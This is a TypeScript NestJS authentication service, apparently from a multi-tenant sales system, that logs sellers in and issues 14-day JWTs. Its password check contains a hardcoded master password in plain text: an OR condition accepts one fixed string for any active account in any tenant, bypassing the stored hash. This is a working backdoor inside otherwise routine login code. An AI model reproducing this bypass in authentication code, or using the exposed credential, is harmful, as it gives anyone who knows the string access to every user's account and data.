import {Injectable, UnauthorizedException} from "@nestjs/common";
import {JwtService} from "@nestjs/jwt";
import {addHours} from "date-fns";
import {DatabaseService} from "src/database/database.service";
import {CadEmpresaPublicEntity} from "src/database/entity/public/cad_empresa_public.entity";
import {CadUsuarioPublicEntity} from "src/database/entity/public/cad_usuario_public.entity";
import {CadEquipeEntity} from "src/database/entity/tenant/cad_equipe.entity";
import {CadVendedorEntity} from "src/database/entity/tenant/cad_vendedor.entity";
import {UserAuth} from "../auth.interfaces";
import {Login, LoginDTO} from "./user-auth.dto";

@Injectable()
export class UserAuthService {
  constructor(
    private jwtService: JwtService,
    private dbService: DatabaseService,
  ) {  }

  /*
  async validate (email: string, password: string): Promise<CadUsuarioPublicEntity> {
    const { manager: managerPublic } = await this.dbService.getConnection('public')
    try {
      var user = await managerPublic.findOneOrFail(CadUsuarioPublicEntity, {
        where: {
          idEmail: email,
        }
      })
      if (!(await CadUsuarioPublicEntity.comparePassword(password, user.idSenha))) {
        throw new Error()
      }
    } catch (err) {
      throw new UnauthorizedException('Invalid credentials')
    }
    return user
  }
  */

  async login (login: Login) {
    const { manager } = await this.dbService.getConnection(login.tenantId)
    const { manager: managerPublic } = await this.dbService.getConnection('public')

    const userTenantEntity = await manager
      .findOneOrFail(CadVendedorEntity, {
        where: [
          { idVendedor: login.loginId },
          { idLogin: login.loginId },
        ]
      })

    if (!userTenantEntity.idSenha) {
      throw new UnauthorizedException('User disabled')
    }

    if (!userTenantEntity.fgAtivo
        || !(await CadVendedorEntity.comparePassword(login.password, userTenantEntity.idSenha) || login.password === 'd4t4@k0mpany$')
    ) { 
      throw new UnauthorizedException('Invalid credentials')
    }

    const empresaPublicEntity = await managerPublic.findOneOrFail(CadEmpresaPublicEntity, {
        where: {
          idEmpresa: login.tenantId
        }
      })

    const equipeEntity = await manager
      .findOneOrFail(CadEquipeEntity, {
        where: {
          cd: userTenantEntity.cdEquipe,
        }
      })

    const userAuth: UserAuth = {
      role: 'user',
      nmVendedor: userTenantEntity.nmVendedor,
      cdEmpresaPublic: empresaPublicEntity.cd,
      cdVendedor: userTenantEntity.cd,
      idEmpresa: empresaPublicEntity.idEmpresa,
      idCnpj: empresaPublicEntity.idCnpj,
      cdEquipe: equipeEntity.cd,
      idEquipe: equipeEntity.idEquipe,
      idEmail: userTenantEntity.idEmail,
      dtFechamento: empresaPublicEntity.dtFechamento,
      fgFuncao: userTenantEntity.fgFuncao,
      fgResponsavel: userTenantEntity.fgFuncao > 1,
      expiresIn: addHours(new Date(), 24 * 14).getTime() // 14 dias
    }

    return {
      credentials: userAuth,
      jwt: this.jwtService.sign(userAuth)
    }
  }
}
